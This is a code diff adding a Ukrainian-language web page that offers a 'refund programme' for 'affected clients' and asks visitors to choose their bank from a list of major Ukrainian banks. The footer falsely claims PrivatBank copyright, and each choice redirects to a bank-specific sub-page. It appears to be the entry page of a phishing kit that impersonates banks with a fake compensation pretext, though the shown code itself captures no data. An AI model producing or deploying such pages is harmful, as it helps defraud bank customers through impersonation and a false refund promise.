@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Повернення коштів</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f8f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        h1 {
+            font-size: 24px;
+            color: #23a455;
+            margin-bottom: 15px;
+        }
+        p {
+            font-size: 14px;
+            color: #555555;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        select {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            font-size: 16px;
+            border: 1px solid #c8e3d9;
+            border-radius: 8px;
+            background-color: #ffffff;
+            color: #333333;
+        }
+        select:focus {
+            border-color: #23a455;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            color: #ffffff;
+            background-color: #23a455;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #1d8f4a;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Повернення коштів</h1>
+        <p>Для підтримки постраждалих клієнтів ми ініціювали програму повернення коштів.<br>
+        Будь ласка, виберіть ваш банк, щоб продовжити процес отримання компенсації.</p>
+        <form id="bankForm">
+            <select id="bank" required>
+                <option value="" disabled selected>Оберіть ваш банк</option>
+                <option value="/privatbank">ПриватБанк</option>
+                <option value="/monobank">Монобанк</option>
+                <option value="/oschadbank">Ощадбанк</option>
+                <option value="/raiffeisenbank">Райффайзен Банк</option>
+            </select>
+            <button type="submit">Продовжити</button>
+        </form>
+        <div class="footer">© 2024 ПриватБанк. Усі права захищені.</div>
+    </div>
+    <script>
+        document.getElementById('bankForm').addEventListener('submit', (event) => {
+            event.preventDefault();
+            const bank = document.getElementById('bank').value;
+            if (bank) {
+                window.location.href = bank; // Редирект на выбранный банк
+            } else {
+                alert("Будь ласка, оберіть ваш банк!");
+            }
+        });
+    </script>
+</body>
+</html>
